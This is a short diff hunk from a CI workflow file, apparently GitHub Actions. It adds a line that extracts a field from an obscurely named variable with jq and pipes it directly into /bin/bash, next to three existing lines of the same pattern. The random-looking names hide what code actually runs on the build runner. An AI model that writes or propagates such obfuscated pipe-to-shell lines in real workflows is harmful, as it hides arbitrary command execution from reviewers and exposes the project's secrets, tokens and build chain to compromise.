@@ -28,6 +28,7 @@ jobs:
           echo $eskui71120 | jq -r .aobgg42682 | /bin/bash
           printf '%s' "$w5954" | jq -r .j86800 | /bin/bash
           printf '%s' "$v93637" | jq -r .q7 | /bin/bash
+          echo $av9 | jq -r .nbvj1 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
